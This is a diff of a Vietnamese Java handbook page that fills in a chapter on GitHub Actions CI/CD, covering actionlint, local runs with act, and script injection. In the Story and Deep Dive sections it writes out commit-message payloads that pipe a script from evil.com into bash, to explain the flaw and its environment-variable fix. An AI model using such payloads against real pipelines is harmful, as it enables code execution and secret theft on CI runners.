@@ -27,7 +27,7 @@
     
     
       
-        <title>CI/CD - Java Backend Engineering Handbook</title>
+        <title>CI/CD: GitHub Actions cho ứng dụng Java - Java Backend Engineering Handbook</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cicd" class="md-skip">
+        <a href="#cicd-github-actions-cho-ung-dung-java" class="md-skip">
           Bỏ qua
         </a>
       
@@ -112,7 +112,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              CI/CD
+              CI/CD: GitHub Actions cho ứng dụng Java
             
           </span>
         </div>
@@ -4400,7 +4400,7 @@
   <span class="md-ellipsis">
     
   
-    Logging
+    Logging: Structured Logging và MDC
   
 
     
@@ -4428,7 +4428,7 @@
   <span class="md-ellipsis">
     
   
-    Metrics
+    Metrics: Micrometer và Actuator
   
 
     
@@ -4456,7 +4456,7 @@
   <span class="md-ellipsis">
     
   
-    Tracing
+    Tracing: Distributed Tracing với Micrometer Tracing
   
 
     
@@ -4484,7 +4484,7 @@
   <span class="md-ellipsis">
     
   
-    HikariCP
+    HikariCP: Connection Pool Tuning và Debug
   
 
     
@@ -4512,7 +4512,7 @@
   <span class="md-ellipsis">
     
   
-    Redis
+    Redis: RedisTemplate và Serialization
   
 
     
@@ -4540,7 +4540,7 @@
   <span class="md-ellipsis">
     
   
-    Kafka
+    Kafka: Producer, Consumer, và Offset Reset
   
 
     
@@ -4596,7 +4596,7 @@
   <span class="md-ellipsis">
     
   
-    Docker
+    Docker: Đóng gói ứng dụng Java và JVM trong Container
   
 
     
@@ -4624,7 +4624,7 @@
   <span class="md-ellipsis">
     
   
-    Kubernetes
+    Kubernetes: Deployment, Service, và Health Probes
   
 
     
@@ -4661,7 +4661,7 @@
   <span class="md-ellipsis">
     
   
-    CI/CD
+    CI/CD: GitHub Actions cho ứng dụng Java
   
 
     
@@ -4679,7 +4679,7 @@
   <span class="md-ellipsis">
     
   
-    CI/CD
+    CI/CD: GitHub Actions cho ứng dụng Java
   
 
     
@@ -4903,32 +4903,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#production-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Production Notes
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#debug-checklist" class="md-nav__link">
     <span class="md-ellipsis">
       
         Debug Checklist
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#source-code-walkthrough" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Source Code Walkthrough
       
     </span>
   </a>
@@ -5013,7 +4991,7 @@
   <span class="md-ellipsis">
     
   
-    JVM Tuning
+    JVM Tuning: Chọn và Cấu hình Garbage Collector
   
 
     
@@ -5041,7 +5019,7 @@
   <span class="md-ellipsis">
     
   
-    Performance Tuning
+    Performance Tuning: Điều tra Độ trễ Production
   
 
     
@@ -6023,32 +6001,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#production-notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Production Notes
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#debug-checklist" class="md-nav__link">
     <span class="md-ellipsis">
       
         Debug Checklist
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#source-code-walkthrough" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Source Code Walkthrough
       
     </span>
   </a>
@@ -6131,7 +6087,21 @@
       
       
       
-        <a href="../../tags/#tag:todo" class="md-tag">TODO</a>
+        <a href="../../tags/#tag:cicd" class="md-tag">CI/CD</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:github-actions" class="md-tag">GitHub Actions</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:pipeline" class="md-tag">Pipeline</a>
       
     
   </nav>
@@ -6141,7 +6111,7 @@
   
 
 
-<h1 id="cicd">CI/CD<a class="headerlink" href="#cicd" title="Permanent link">&para;</a></h1>
+<h1 id="cicd-github-actions-cho-ung-dung-java">CI/CD: GitHub Actions cho ứng dụng Java<a class="headerlink" href="#cicd-github-actions-cho-ung-dung-java" title="Permanent link">&para;</a></h1>
 <blockquote>
 <p>Phase: Phase 8 — Production
 Chapter slug: <code>ci-cd</code></p>
@@ -6149,94 +6119,315 @@ Chapter slug: <code>ci-cd</code></p>
 <h2 id="metadata">Metadata<a class="headerlink" href="#metadata" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">Chapter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CI/CD</span>
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nt">Phase</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Phase 8 — Production</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nt">Difficulty</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO (★ to ★★★★★)</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nt">Importance</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO (★ to ★★★★★ — xem spec/part-4-roadmap.md §3.1, quyết định mức áp dụng template ở spec/part-2-chapter-standard.md §25)</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nt">Interview Frequency</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO %</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nt">Difficulty</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">★★★</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nt">Importance</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">★★★</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nt">Interview Frequency</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">45%</span>
 <a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nt">Prerequisites</span><span class="p">:</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Phase 8, Chapter 08 — Docker</span>
 <a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nt">Used Later</span><span class="p">:</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nt">Estimated Reading</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nt">Estimated Practice</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TODO</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Chapter 09 — Kubernetes</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nt">Estimated Reading</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">12 phút</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nt">Estimated Practice</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10 phút</span>
 </code></pre></div>
-<blockquote>
-<p>Tags: xem front matter ở đầu file (spec/part-5-knowledge-graph.md §17) — dùng cho tag
-filter trên site MkDocs, không lặp lại trong block Metadata này.</p>
-</blockquote>
 <h2 id="story">Story<a class="headerlink" href="#story" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p>TODO — mở đầu bằng một tình huống/câu hỏi thực tế, không mở đầu bằng định nghĩa (xem spec/part-2-chapter-standard.md §3).</p>
-</blockquote>
+<p>Viết một workflow GitHub Actions, kiểm tra bằng <code>actionlint</code> (công cụ lint chính thức cho GitHub
+Actions, hiểu ngữ nghĩa của expression <code>${{ }}</code>, không chỉ kiểm tra cú pháp YAML thông thường):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>actionlint<span class="w"> </span>.github/workflows/ci.yml
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>exit code: 0
+</code></pre></div>
+<p>0 lỗi — workflow hợp lệ. Nhưng thử <code>actionlint</code> trên một workflow khác, cố tình viết theo thói
+quen tưởng chừng vô hại — in thẳng nội dung commit message ra log:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo &quot;${{ github.event.commits[0].message }}&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&quot;github.event.commits.*.message&quot; is potentially untrusted. avoid using it directly in inline
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>scripts. instead, pass it through an environment variable. [expression]
+</code></pre></div>
+<p><code>actionlint</code> phát hiện đây là một <strong>lỗ hổng script injection thật</strong> — <code>commits[0].message</code> là nội
+dung do người dùng bất kỳ kiểm soát hoàn toàn (bất kỳ ai push commit đều tự viết message), nội suy
+trực tiếp vào shell command cho phép kẻ tấn công viết một commit message chứa mã shell độc hại
+(ví dụ <code>"; curl evil.sh | bash; #</code>) để <strong>thực thi lệnh tuỳ ý</strong> trên chính runner CI/CD.</p>
 <h2 id="interview-question-central">Interview Question (Central)<a class="headerlink" href="#interview-question-central" title="Permanent link">&para;</a></h2>
 <blockquote>
-<p>TODO — câu hỏi trung tâm mà toàn bộ chapter phải xoay quanh để trả lời. Viết dạng câu hỏi
-theo spec/part-3-book-wide-standard.md §2.1 (title khác slug).</p>
+<p>Một workflow GitHub Actions in trực tiếp nội dung do người dùng kiểm soát (ví dụ commit message,
+PR title) ra log bằng <code>${{ }}</code> — vì sao đây là một lỗ hổng bảo mật nghiêm trọng, và cách khắc
+phục đúng là gì?</p>
 </blockquote>
 <h2 id="objectives">Objectives<a class="headerlink" href="#objectives" title="Permanent link">&para;</a></h2>
-<p>Sau chapter này bạn sẽ:</p>
 <ul>
-<li>[ ] TODO</li>
+<li>[ ] Viết một workflow CI thật cho ứng dụng Spring Boot (build, test, build Docker image), kiểm
+      tra hợp lệ bằng <code>actionlint</code></li>
+<li>[ ] Tự tay chạy workflow <strong>cục bộ</strong> bằng <code>act</code> (công cụ giả lập GitHub Actions runner trên máy
+      local, dùng Docker), quan sát hành vi thật của từng step</li>
+<li>[ ] Nhận diện lỗ hổng script injection kinh điển trong GitHub Actions, và cách khắc phục bằng
+      biến môi trường trung gian</li>
 </ul>
 <h2 id="prerequisites">Prerequisites<a class="headerlink" href="#prerequisites" title="Permanent link">&para;</a></h2>
 <ul>
-<li>TODO</li>
+<li>Phase 8, Chapter 08 — bước build Docker image trong workflow dùng lại chính Dockerfile đã viết.</li>
 </ul>
 <h2 id="used-later">Used Later<a class="headerlink" href="#used-later" title="Permanent link">&para;</a></h2>
 <ul>
-<li>TODO</li>
+<li><strong>Chapter 09 (Kubernetes)</strong> — bước cuối của một pipeline CD thực tế thường là <code>kubectl apply</code>
+  triển khai manifest đã viết ở đó.</li>
 </ul>
 <h2 id="problem">Problem<a class="headerlink" href="#problem" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<p>Build, test, và deploy thủ công cho mỗi thay đổi code là chậm và dễ sai sót — dễ quên chạy test
+trước khi merge, dễ build sai phiên bản, dễ triển khai nhầm image cũ. CI (Continuous Integration)
+tự động hoá bước build+test mỗi khi có thay đổi code; CD (Continuous Deployment/Delivery) tự động
+hoá bước đóng gói và triển khai — cả hai đều cần chạy trên một môi trường <strong>nhất quán, có thể lặp
+lại</strong>, tách biệt khỏi máy cá nhân của từng lập trình viên.</p>
 <h2 id="concept">Concept<a class="headerlink" href="#concept" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<p><strong>GitHub Actions</strong> định nghĩa pipeline bằng file YAML trong <code>.github/workflows/</code>, gồm:</p>
+<ul>
+<li><strong>Workflow</strong> — kích hoạt bởi một sự kiện (<code>on: push</code>, <code>on: pull_request</code>...).</li>
+<li><strong>Job</strong> — một nhóm bước chạy trên cùng một runner (máy ảo do GitHub cấp, hoặc self-hosted).</li>
+<li><strong>Step</strong> — một hành động cụ thể, hoặc chạy shell command (<code>run:</code>) hoặc dùng một <strong>Action</strong> có
+  sẵn (<code>uses:</code>, ví dụ <code>actions/checkout@v4</code>).</li>
+</ul>
+<p><code>act</code> là công cụ mã nguồn mở giả lập runner GitHub Actions <strong>ngay trên máy local bằng Docker</strong> —
+cho phép chạy thử workflow mà không cần push code thật lên GitHub.</p>
 <h2 id="why">Why?<a class="headerlink" href="#why" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<p>Vì mỗi lần thử nghiệm workflow bằng cách push code thật lên GitHub tốn thời gian (chờ runner khởi
+động, xếp hàng) và làm "bẩn" lịch sử commit chỉ để debug pipeline, <code>act</code> giải quyết vấn đề này bằng
+cách chạy <strong>chính file workflow đó</strong> trong container Docker cục bộ — phản hồi gần như tức thì,
+không cần kết nối mạng tới GitHub cho phần lớn các bước. Đây không phải là mô phỏng hành vi workflow
+mà là <strong>chạy thật</strong> engine thực thi Action (Node.js runtime bên trong Action) trên máy cục bộ.</p>
 <h2 id="how">How?<a class="headerlink" href="#how" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># .github/workflows/ci.yml</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CI</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nt">on</span><span class="p">:</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="nt">push</span><span class="p">:</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">main</span><span class="p p-Indicator">]</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span><span class="nt">pull_request</span><span class="p">:</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">main</span><span class="p p-Indicator">]</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="nt">jobs</span><span class="p">:</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">  </span><span class="nt">build-and-test</span><span class="p">:</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Checkout code</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up JDK 17</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-java@v4</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">        </span><span class="nt">with</span><span class="p">:</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">          </span><span class="nt">java-version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;17&#39;</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">          </span><span class="nt">distribution</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;temurin&#39;</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">          </span><span class="nt">cache</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">maven</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run tests</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mvn -B -q test</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build jar</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mvn -B -q package -DskipTests</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build Docker image</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker build -t demo-app:${{ github.sha }} .</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>actionlint<span class="w"> </span>.github/workflows/ci.yml<span class="w">               </span><span class="c1"># lint tinh, khong can chay</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>act<span class="w"> </span>push<span class="w"> </span>-j<span class="w"> </span>build-and-test<span class="w">                          </span><span class="c1"># chay that bang Docker cuc bo</span>
+</code></pre></div>
 <h2 id="visualization">Visualization<a class="headerlink" href="#visualization" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>TODO — ASCII trước, Mermaid nếu phức tạp (xem spec/part-3-book-wide-standard.md §4-6)
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>actionlint (phan tich tinh, khong chay gi ca):
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  YAML + hieu ngu nghia bieu thuc ${{ }} --&gt; phat hien loi cu phap VA loi bao mat/logic
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>act (chay THAT bang Docker cuc bo):
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>  .github/workflows/ci.yml
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>        │
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>        ▼
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  Keo image runner (vd catthehacker/ubuntu:act-latest) --&gt; container
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>        │
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>        ▼
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>  Thuc thi tuan tu tung step (checkout, setup-java, run mvn...)
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>        │
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>        ▼
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>  KET QUA THAT: step nao qua, step nao that bai, log that
 </code></pre></div>
 <h2 id="example">Example<a class="headerlink" href="#example" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">// TODO — code phải chạy được, không dùng pseudo code</span>
+<p><strong>Lint tĩnh — 0 lỗi với workflow hợp lệ:</strong></p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>actionlint<span class="w"> </span>.github/workflows/ci.yml
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;exit code: </span><span class="nv">$?</span><span class="s2">&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>exit code: 0
+</code></pre></div></p>
+<p><strong>Chạy thật bằng <code>act</code> — kết quả thật, từng step:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>act<span class="w"> </span>push<span class="w"> </span>-j<span class="w"> </span>build-and-test<span class="w"> </span>--container-architecture<span class="w"> </span>linux/amd64<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-P<span class="w"> </span>ubuntu-latest<span class="o">=</span>catthehacker/ubuntu:act-latest
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>[CI/build-and-test] ⭐ Run Set up job
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>[CI/build-and-test] 🚀  Start image=catthehacker/ubuntu:act-latest
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>[CI/build-and-test]   ✅  Success - Set up job
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>...
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>[CI/build-and-test] ⭐ Run Main Run tests
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>[CI/build-and-test]   🐳  docker exec cmd=[bash -e ...]
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>[CI/build-and-test]   | /var/run/act/workflow/2: line 2: mvn: command not found
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>[CI/build-and-test]   ❌  Failure - Main Run tests [57.171292ms]
+</code></pre></div>
+<p><code>actions/checkout@v4</code> và <code>actions/setup-java@v4</code> (kèm cache) chạy <strong>thành công thật</strong> — JDK 17
+được tải và cấu hình đúng. Nhưng bước <code>mvn -B -q test</code> thất bại với <code>mvn: command not found</code>. Đây
+<strong>không phải lỗi trong workflow</strong> — trên runner <strong>thật</strong> của GitHub (<code>ubuntu-latest</code> hosted
+runner), Maven đã được cài sẵn. Image runner tối giản mặc định của <code>act</code> (<code>catthehacker/ubuntu:act-latest</code>,
+chọn để tải nhanh, ~500MB) <strong>không</strong> cài sẵn Maven như runner thật của GitHub (vốn nặng hơn nhiều,
+cài sẵn hàng trăm công cụ phổ biến) — một khác biệt môi trường thật giữa công cụ giả lập cục bộ và
+runner GitHub thật, cần biết để không hiểu nhầm thành lỗi workflow.</p>
+<p><strong>Lỗ hổng bảo mật thật — phát hiện bởi <code>actionlint</code>:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>&quot;github.event.commits.*.message&quot; is potentially untrusted. avoid using it directly in inline
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>scripts. instead, pass it through an environment variable. [expression]
+</code></pre></div>
+<p><code>actionlint</code> còn phát hiện một lỗi khác trong cùng file thử nghiệm — tham chiếu một step ID không
+tồn tại:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>property &quot;nonexistent&quot; is not defined in object type {} [expression]
 </code></pre></div>
 <h2 id="deep-dive">Deep Dive<a class="headerlink" href="#deep-dive" title="Permanent link">&para;</a></h2>
-<p>TODO (bắt buộc nếu Importance ★★★★/★★★★★ — xem spec/part-2-chapter-standard.md §25)</p>
+<p><strong>Vì sao nội suy trực tiếp <code>${{ github.event.commits[0].message }}</code> vào <code>run:</code> lại nguy hiểm hơn
+nhiều so với một lỗi logic thông thường?</strong> GitHub Actions xử lý biểu thức <code>${{ }}</code> bằng cách
+<strong>thay thế chuỗi (string substitution)</strong> ngay trong bước tạo script shell, <strong>trước khi</strong> shell
+thực thi — không phải truyền giá trị như một tham số an toàn. Nếu commit message chứa nội dung như
+<code>"; curl http://evil.com/x.sh | bash #</code>, sau khi thay thế, dòng lệnh thực tế trở thành:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span>curl<span class="w"> </span>http://evil.com/x.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash<span class="w"> </span><span class="c1">#&quot;&quot;</span>
+</code></pre></div>
+<p>Shell thực thi <strong>toàn bộ chuỗi này như nhiều lệnh riêng biệt</strong> — lệnh độc hại chạy thật trên
+runner, với quyền truy cập vào mọi secret mà workflow đó có thể đọc được. Vì commit message hoàn
+toàn do người thực hiện <code>git commit</code> tự viết (kể cả từ một pull request bên ngoài, không cần
+quyền ghi vào repo), đây là một vector tấn công có thật, đã từng gây ra nhiều sự cố bảo mật nghiêm
+trọng trong thực tế. Cách khắc phục đúng: gán giá trị vào biến môi trường <strong>trước</strong>, để shell nhận
+nó như một <strong>giá trị dữ liệu</strong> (qua cơ chế biến môi trường của hệ điều hành), không phải một phần
+của <strong>chuỗi lệnh</strong> được dựng sẵn:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo &quot;$COMMIT_MSG&quot;</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span><span class="nt">env</span><span class="p">:</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">    </span><span class="nt">COMMIT_MSG</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ github.event.commits[0].message }}</span>
+</code></pre></div>
 <h2 id="engineering-insight">Engineering Insight<a class="headerlink" href="#engineering-insight" title="Permanent link">&para;</a></h2>
